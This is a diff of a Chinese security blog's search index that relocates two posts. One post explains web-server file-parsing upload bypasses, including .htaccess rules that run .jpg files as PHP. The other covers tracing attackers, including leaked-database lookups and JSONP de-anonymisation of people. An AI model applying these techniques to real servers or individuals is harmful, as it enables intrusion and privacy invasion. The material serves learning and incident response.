-<h1 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h1><h2 id="反制手段"><a href="#反制手段" class="headerlink" title="反制手段"></a>反制手段</h2><p>IP定位技术：根据IP定位物理地址—代理IP。<br>ID追踪术：搜索引擎、社交平台、技术论坛、社工库匹配。<br>网站URL：域名WHOIS查询注册人姓名、地址、电话和邮箱。<br>恶意样本：提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析。<br>社交账号：基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 IP及社交信息等。</p>
-<h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><p>攻击路径；<br>攻击目的：拿到权限、窃取数据、获取利益、DDOS等；<br>网络代理：代理IP、跳板机、C2服务器等；<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等。<br>攻击者身份画像：虚拟身份：ID、昵称、网名；真实身份：姓名、物理位置；<br>联系方式：手机号、QQ&#x2F;微信、邮箱；<br>组织情况：单位名称、职位信息。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="威胁情报厂商"><a href="#威胁情报厂商" class="headerlink" title="威胁情报厂商"></a>威胁情报厂商</h2><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>启明Venuseye：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a><br>绿盟NTI:<a href="https://nti.nsfocus.com/">https://nti.nsfocus.com/</a><br>奇安信：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a><br>安恒：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a><br>360：<a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></p>
-<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>中国万网域名WHOIS信息查询地址：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>纳网域名WHOIS信息查询地址：<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>中资源域名WHOIS信息查询地址：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a><br>三五互联域名WHOIS信息查询地址：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a><br>新网互联域名WHOIS信息查询地址：<a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a><br>美橙互联域名WHOIS信息查询地址：<a href="https://whois.cndns.com/">https://whois.cndns.com/</a><br>爱名网域名WHOIS信息查询地址：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a><br>易名网域名WHOIS信息查询地址：<a href="https://whois.ename.net/">https://whois.ename.net/</a><br>站长工具类第三方查询地址(部分网站注册人信息会隐藏或提示联系域名注册商获取，可以去who.is查询看看)<br>Kali的查询：whois -h 注册服务器地址  域名<br>站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a><br>国外的who.is：<a href="https://who.is/">https://who.is/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a><br>还有Kali中自带的whois查询、一些集成工具等。<br>SSL证书查询网站整理如下：<br>主要网站如下：<br>（1）<a href="https://crt.sh/">https://crt.sh/</a><br>（2）<a href="https://censys.io/">https://censys.io/</a><br>（3）<a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br>（4）<a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p>
-<h2 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h2><p>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a><br>爱站： <a href="https://www.aizhan.com/">https://www.aizhan.com/</a><br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
-<h2 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h2><p>公众号：埃文科技、云警助手等<br>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a> <a href="https://chaipip.com/aiwen.html">https://chaipip.com/aiwen.html</a></p>
-<h1 id="确认个人信息"><a href="#确认个人信息" class="headerlink" title="确认个人信息"></a>确认个人信息</h1><h2 id="已知手机或邮箱"><a href="#已知手机或邮箱" class="headerlink" title="已知手机或邮箱"></a>已知手机或邮箱</h2><p>查支付宝转账，验证姓名。<br>QQ &#x2F;微信添加好友搜索<br>reg007进行相同手机号注册平台搜索<br>社交平台查找(头条、抖音、微博等)</p>
-<h2 id="已知ID或姓名"><a href="#已知ID或姓名" class="headerlink" title="已知ID或姓名"></a>已知ID或姓名</h2><p>直接谷歌、百度、bing关键次搜索<br>各大平台SRC、各大白帽子交流群、交流论坛等<br>社交平台查找(贴吧、头条、抖音、微博等)</p>
-<h2 id="捕获恶意文件"><a href="#捕获恶意文件" class="headerlink" title="捕获恶意文件"></a>捕获恶意文件</h2><p>解密、逆行脱壳等直接获取一些个人账号ID、CS服务器地址、一些域名信息、邮件发送服务器地址等</p>
-<h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><p>tg社工库查询</p>
-]]></content>
-      <categories>
-        <category>应急响应</category>
-      </categories>
-      <tags>
-        <tag>溯源</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解析漏洞知识记录</title>
-    <url>/posts/64ae55e3.html</url>
-    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
-<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
-<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
-<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
-<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
-<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
-<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
-<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
-<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
-<p>将所有名字里含shell的文件识别为php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-<p>让.jpg后缀名文件以php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>解析漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>认识JWT</title>
     <url>/posts/cf3c54f2.html</url>
     <content><![CDATA[<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JWT(json web token)是用于系统之间发送加密签名的JSON数据的标准化格式(载荷可以是字符串或json数据)，作为身份认证、会话处理和访问控制机制的一部分<br>与传统的会话令牌不同，服务器所需要的数据存储在jwt本身的客户端</p>
@@ -2805,6 +2762,26 @@ w:Rock-y did-nt like that</div>
       </categories>
       <tags>
         <tag>网络请求</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解析漏洞知识记录</title>
+    <url>/posts/64ae55e3.html</url>
+    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
+<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
+<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
+<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
+<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
+<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
+<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
+<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
+<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
+<p>将所有名字里含shell的文件识别为php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>让.jpg后缀名文件以php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>解析漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2972,6 +2949,29 @@ w:Rock-y did-nt like that</div>
       </categories>
       <tags>
         <tag>Google hacking</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>溯源小技巧</title>
+    <url>/posts/7dea39be.html</url>
+    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="溯源反制思路"><a href="#溯源反制思路" class="headerlink" title="溯源反制思路"></a>溯源反制思路</h2><p>反向渗透攻击IP、反向信息收集攻击IP、利用部署的蜜罐获取攻击者信息、溯源钓鱼邮件</p>
+<h2 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h2><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等。<br>日志与流量分析，异常的通讯流量、攻击源与攻击目标等。<br>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等。<br>邮件钓鱼，获取恶意文件样本、钓鱼网站URL等。<br>蜜罐系统，获取攻击者行为、意图的相关信息。</p>
+<h1 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h1><h2 id="反制手段"><a href="#反制手段" class="headerlink" title="反制手段"></a>反制手段</h2><p>IP定位技术：根据IP定位物理地址—代理IP。<br>ID追踪术：搜索引擎、社交平台、技术论坛、社工库匹配。<br>网站URL：域名WHOIS查询注册人姓名、地址、电话和邮箱。<br>恶意样本：提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析。<br>社交账号：基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 IP及社交信息等。</p>
+<h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><p>攻击路径；<br>攻击目的：拿到权限、窃取数据、获取利益、DDOS等；<br>网络代理：代理IP、跳板机、C2服务器等；<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等。<br>攻击者身份画像：虚拟身份：ID、昵称、网名；真实身份：姓名、物理位置；<br>联系方式：手机号、QQ&#x2F;微信、邮箱；<br>组织情况：单位名称、职位信息。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="威胁情报厂商"><a href="#威胁情报厂商" class="headerlink" title="威胁情报厂商"></a>威胁情报厂商</h2><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>启明Venuseye：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a><br>绿盟NTI:<a href="https://nti.nsfocus.com/">https://nti.nsfocus.com/</a><br>奇安信：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a><br>安恒：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a><br>360：<a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></p>
+<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>中国万网域名WHOIS信息查询地址：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>纳网域名WHOIS信息查询地址：<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>中资源域名WHOIS信息查询地址：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a><br>三五互联域名WHOIS信息查询地址：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a><br>新网互联域名WHOIS信息查询地址：<a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a><br>美橙互联域名WHOIS信息查询地址：<a href="https://whois.cndns.com/">https://whois.cndns.com/</a><br>爱名网域名WHOIS信息查询地址：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a><br>易名网域名WHOIS信息查询地址：<a href="https://whois.ename.net/">https://whois.ename.net/</a><br>站长工具类第三方查询地址(部分网站注册人信息会隐藏或提示联系域名注册商获取，可以去who.is查询看看)<br>Kali的查询：whois -h 注册服务器地址  域名<br>站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a><br>国外的who.is：<a href="https://who.is/">https://who.is/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a><br>还有Kali中自带的whois查询、一些集成工具等。<br>SSL证书查询网站整理如下：<br>主要网站如下：<br>（1）<a href="https://crt.sh/">https://crt.sh/</a><br>（2）<a href="https://censys.io/">https://censys.io/</a><br>（3）<a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br>（4）<a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p>
+<h2 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h2><p>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a><br>爱站： <a href="https://www.aizhan.com/">https://www.aizhan.com/</a><br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
+<h2 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h2><p>公众号：埃文科技、云警助手等<br>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a> <a href="https://chaipip.com/aiwen.html">https://chaipip.com/aiwen.html</a></p>
+<h1 id="确认个人信息"><a href="#确认个人信息" class="headerlink" title="确认个人信息"></a>确认个人信息</h1><h2 id="已知手机或邮箱"><a href="#已知手机或邮箱" class="headerlink" title="已知手机或邮箱"></a>已知手机或邮箱</h2><p>查支付宝转账，验证姓名。<br>QQ &#x2F;微信添加好友搜索<br>reg007进行相同手机号注册平台搜索<br>社交平台查找(头条、抖音、微博等)</p>
+<h2 id="已知ID或姓名"><a href="#已知ID或姓名" class="headerlink" title="已知ID或姓名"></a>已知ID或姓名</h2><p>直接谷歌、百度、bing关键次搜索<br>各大平台SRC、各大白帽子交流群、交流论坛等<br>社交平台查找(贴吧、头条、抖音、微博等)</p>
+<h2 id="捕获恶意文件"><a href="#捕获恶意文件" class="headerlink" title="捕获恶意文件"></a>捕获恶意文件</h2><p>解密、逆行脱壳等直接获取一些个人账号ID、CS服务器地址、一些域名信息、邮件发送服务器地址等</p>
+<h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><p>tg社工库查询</p>
+]]></content>
+      <categories>
+        <category>应急响应</category>
+      </categories>
+      <tags>
+        <tag>溯源</tag>
       </tags>
   </entry>
   <entry>
